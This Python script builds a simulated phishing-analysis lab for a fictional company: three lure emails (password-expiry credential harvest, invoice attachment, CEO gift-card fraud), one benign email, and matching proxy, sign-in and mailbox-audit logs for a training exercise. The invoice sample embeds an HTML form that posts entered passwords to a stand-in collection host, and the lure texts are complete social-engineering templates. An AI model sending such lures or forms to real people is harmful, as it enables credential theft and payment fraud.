#!/usr/bin/env python3
"""
generate_samples.py - Rebuilds the simulated lab dataset in ../samples/.

All organizations, people, domains and IPs are FICTIONAL:
  * Domains use the reserved .example TLD (RFC 2606) - they never resolve.
  * IPs use documentation ranges 192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24 (RFC 5737).
  * Attachments are harmless text/HTML with no active content.

Scenario: "Ridgeline Logistics" (ridgeline.example) SOC receives user-reported emails.
"""

import csv
import os
from email.message import EmailMessage

OUT = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "samples")
os.makedirs(OUT, exist_ok=True)


def write_eml(name, msg, received, auth):
    """Prepend Received/Authentication-Results headers the way MTAs do."""
    raw = msg.as_string()
    prefix = "".join(f"Received: {r}\n" for r in received)
    prefix += f"Authentication-Results: mx1.ridgeline.example;\n {auth}\n"
    with open(os.path.join(OUT, name), "w", newline="\n") as f:
        f.write(prefix + raw)


# ---------------------------------------------------------------- CASE 01
m = EmailMessage()
m["From"] = "Ridgeline IT Service Desk <helpdesk@ridgeIine-support.example>"
m["Reply-To"] = "helpdesk@ridgeIine-support.example"
m["Return-Path"] = "<bounce-7731@mailer-cloudsend.example>"
m["To"] = "jsmith@ridgeline.example, apatel@ridgeline.example, mlee@ridgeline.example"
m["Subject"] = "ACTION REQUIRED: Your password expires in 24 hours"
m["Date"] = "Mon, 14 Sep 2026 08:12:44 -0400"
m["Message-ID"] = "<20260914121244.4471@mailer-cloudsend.example>"
m.set_content(
    "Your Ridgeline network password expires within 24 hours.\n"
    "To avoid losing access, verify your account immediately:\n"
    "https://ridgeline-sso-verify.example/auth/login?u=jsmith\n\n"
    "Ridgeline IT Service Desk\n"
)
m.add_alternative("""<html><body>
<p>Dear Employee,</p>
<p>Our records show your Ridgeline network password <b>expires within 24 hours</b>.
Failure to verify will result in your account being <b>suspended</b>.</p>
<p><a href="https://ridgeline-sso-verify.example/auth/login?u=jsmith">https://portal.ridgeline.example/password-reset</a></p>
<p>Thank you,<br>Ridgeline IT Service Desk</p>
</body></html>""", subtype="html")
write_eml(
    "case01_credential_harvest.eml", m,
    received=[
        "from mx-edge.ridgeline.example (mx-edge.ridgeline.example [192.0.2.10]) by mx1.ridgeline.example with ESMTPS id 8F2A1; Mon, 14 Sep 2026 08:12:47 -0400",
        "from smtp07.mailer-cloudsend.example (unknown [203.0.113.77]) by mx-edge.ridgeline.example with ESMTP id 71C0B; Mon, 14 Sep 2026 08:12:46 -0400",
    ],
    auth="spf=fail (sender IP is 203.0.113.77) smtp.mailfrom=mailer-cloudsend.example;\n dkim=none (message not signed);\n dmarc=fail action=none header.from=ridgeIine-support.example",
)

# ---------------------------------------------------------------- CASE 02
m = EmailMessage()
m["From"] = "Pinecrest Supply Accounts <accounts@pinecrest-supply.example>"
m["Reply-To"] = "pinecrest.billing.dept@quickmail-free.example"
m["Return-Path"] = "<accounts@pinecrest-supply.example>"
m["To"] = "ap-team@ridgeline.example"
m["Subject"] = "Overdue invoice #88213 - final notice"
m["Date"] = "Tue, 15 Sep 2026 14:03:10 -0400"
m["Message-ID"] = "<CAF88213.9921@pinecrest-supply.example>"
m.set_content(
    "Hello,\n\nPlease see attached invoice #88213 which is now overdue.\n"
    "Open the attached document to view and approve payment immediately.\n\n"
    "Regards,\nPinecrest Supply - Accounts Receivable\n"
)
attachment_html = b"""<!-- TRAINING SAMPLE - harmless. Simulates an HTML credential-phishing attachment. -->
<html><head><title>Invoice 88213</title></head><body>
<h3>Pinecrest Supply - Secure Document Viewer</h3>
<p>Sign in with your email to view invoice #88213.</p>
<form action="https://docview-secure-share.example/collect.php" method="post">
  <input name="email" placeholder="Email"><input name="pass" type="password" placeholder="Password">
  <button>View Document</button>
</form></body></html>
"""
m.add_attachment(attachment_html, maintype="text", subtype="html", filename="Invoice_88213.html")
write_eml(
    "case02_invoice_attachment.eml", m,
    received=[
        "from mx-edge.ridgeline.example (mx-edge.ridgeline.example [192.0.2.10]) by mx1.ridgeline.example with ESMTPS id 9B7D3; Tue, 15 Sep 2026 14:03:14 -0400",
        "from mail.pinecrest-supply.example (vps-host.cheap-cloud.example [198.51.100.23]) by mx-edge.ridgeline.example with ESMTP id 5E1F9; Tue, 15 Sep 2026 14:03:12 -0400",
    ],
    auth="spf=softfail (domain does not designate 198.51.100.23 as permitted sender) smtp.mailfrom=pinecrest-supply.example;\n dkim=fail (signature did not verify) header.d=pinecrest-supply.example;\n dmarc=fail action=quarantine header.from=pinecrest-supply.example",
)

# ---------------------------------------------------------------- CASE 03
m = EmailMessage()
m["From"] = "Dana Whitfield <dana.whitfield.ceo@quickmail-free.example>"
m["Reply-To"] = "dana.whitfield.ceo@quickmail-free.example"
m["Return-Path"] = "<dana.whitfield.ceo@quickmail-free.example>"
m["To"] = "rgarcia@ridgeline.example"
m["Subject"] = "Quick favor - confidential"
m["Date"] = "Wed, 16 Sep 2026 16:47:31 -0400"
m["Message-ID"] = "<a81f.20260916204731@quickmail-free.example>"
m.set_content(
    "Rosa,\n\nAre you at your desk? I'm stuck in back-to-back board meetings and need a quick favor.\n"
    "I need 6 gift cards ($200 each) for a client appreciation this afternoon. It's urgent and\n"
    "confidential - please don't mention it to anyone yet, I want it to be a surprise.\n\n"
    "Scratch the backs and send me photos of the codes. I'll reimburse you today.\n\n"
    "Dana Whitfield\nCEO, Ridgeline Logistics\nSent from my phone\n"
)
write_eml(
    "case03_bec_giftcard.eml", m,
    received=[
        "from mx-edge.ridgeline.example (mx-edge.ridgeline.example [192.0.2.10]) by mx1.ridgeline.example with ESMTPS id C44E0; Wed, 16 Sep 2026 16:47:35 -0400",
        "from out-19.quickmail-free.example (out-19.quickmail-free.example [198.51.100.140]) by mx-edge.ridgeline.example with ESMTPS id 2D9A6; Wed, 16 Sep 2026 16:47:33 -0400",
    ],
    auth="spf=pass smtp.mailfrom=quickmail-free.example;\n dkim=pass header.d=quickmail-free.example;\n dmarc=pass header.from=quickmail-free.example",
)

# ---------------------------------------------------------------- CASE 04 (benign)
m = EmailMessage()
m["From"] = "Ridgeline HR <hr-notifications@ridgeline.example>"
m["Reply-To"] = "hr@ridgeline.example"
m["Return-Path"] = "<hr-notifications@ridgeline.example>"
m["To"] = "all-staff@ridgeline.example"
m["Subject"] = "Open enrollment reminder - benefits portal now open"
m["Date"] = "Thu, 17 Sep 2026 09:00:02 -0400"
m["Message-ID"] = "<oe2026.0917@ridgeline.example>"
m.set_content(
    "Hi team,\n\nOpen enrollment runs Sept 17 - Oct 2. Review your elections in the benefits portal:\n"
    "https://benefits.ridgeline.example/enroll\n\n"
    "Questions? Reply to this email or stop by HR.\n\nRidgeline HR\n"
)
write_eml(
    "case04_benign_hr_notice.eml", m,
    received=[
        "from internal-relay.ridgeline.example (internal-relay.ridgeline.example [192.0.2.25]) by mx1.ridgeline.example with ESMTPS id E1A77; Thu, 17 Sep 2026 09:00:03 -0400",
    ],
    auth="spf=pass smtp.mailfrom=ridgeline.example;\n dkim=pass header.d=ridgeline.example;\n dmarc=pass header.from=ridgeline.example",
)

# ---------------------------------------------------------------- Supporting logs for CASE 01
# Proxy logs: who clicked the phishing link?
proxy = [
    ["timestamp", "user", "src_ip", "method", "url", "status", "bytes"],
    ["2026-09-14T08:21:05-04:00", "mlee", "10.20.4.18", "GET", "https://intranet.ridgeline.example/home", 200, 18223],
    ["2026-09-14T08:31:52-04:00", "jsmith", "10.20.4.33", "GET", "https://ridgeline-sso-verify.example/auth/login?u=jsmith", 200, 5411],
    ["2026-09-14T08:32:40-04:00", "jsmith", "10.20.4.33", "POST", "https://ridgeline-sso-verify.example/auth/submit", 302, 312],
    ["2026-09-14T08:32:41-04:00", "jsmith", "10.20.4.33", "GET", "https://portal.ridgeline.example/", 200, 22871],
    ["2026-09-14T08:47:13-04:00", "apatel", "10.20.4.51", "GET", "https://ridgeline-sso-verify.example/auth/login?u=apatel", 200, 5411],
    ["2026-09-14T09:02:30-04:00", "mlee", "10.20.4.18", "GET", "https://mail.ridgeline.example/owa", 200, 9812],
]
with open(os.path.join(OUT, "case01_proxy_logs.csv"), "w", newline="") as f:
    csv.writer(f).writerows(proxy)

# Sign-in logs: did the attacker use the stolen password?
signin = [
    ["timestamp", "user", "result", "src_ip", "geo", "user_agent", "mfa"],
    ["2026-09-14T07:58:11-04:00", "jsmith", "success", "192.0.2.50", "Wheeling, US", "Windows 10 / Edge", "satisfied"],
    ["2026-09-14T08:05:42-04:00", "apatel", "success", "192.0.2.50", "Wheeling, US", "Windows 10 / Chrome", "satisfied"],
    ["2026-09-14T09:14:03-04:00", "jsmith", "failure", "203.0.113.200", "Unknown / VPS", "python-requests/2.31", "denied"],
    ["2026-09-14T09:14:40-04:00", "jsmith", "failure", "203.0.113.200", "Unknown / VPS", "python-requests/2.31", "denied"],
    ["2026-09-14T09:16:02-04:00", "jsmith", "success", "203.0.113.200", "Unknown / VPS", "Linux / Firefox", "approved (push)"],
    ["2026-09-14T09:18:55-04:00", "jsmith", "success", "203.0.113.200", "Unknown / VPS", "Linux / Firefox", "n/a (session)"],
    ["2026-09-14T09:40:20-04:00", "mlee", "success", "192.0.2.50", "Wheeling, US", "macOS / Safari", "satisfied"],
]
with open(os.path.join(OUT, "case01_signin_logs.csv"), "w", newline="") as f:
    csv.writer(f).writerows(signin)

# Mailbox audit: what did the attacker do after logging in?
audit = [
    ["timestamp", "user", "src_ip", "operation", "details"],
    ["2026-09-14T09:19:30-04:00", "jsmith", "203.0.113.200", "New-InboxRule", "Name='.' ; From contains 'it' OR 'security' ; MoveToFolder='RSS Feeds' ; MarkAsRead=True"],
    ["2026-09-14T09:21:12-04:00", "jsmith", "203.0.113.200", "SearchQuery", "query='invoice OR wire OR payment'"],
    ["2026-09-14T09:26:48-04:00", "jsmith", "203.0.113.200", "Send", "To=ap-team@ridgeline.example ; Subject='Updated banking details for vendor payments'"],
]
with open(os.path.join(OUT, "case01_mailbox_audit.csv"), "w", newline="") as f:
    csv.writer(f).writerows(audit)

print(f"Samples written to {os.path.abspath(OUT)}")
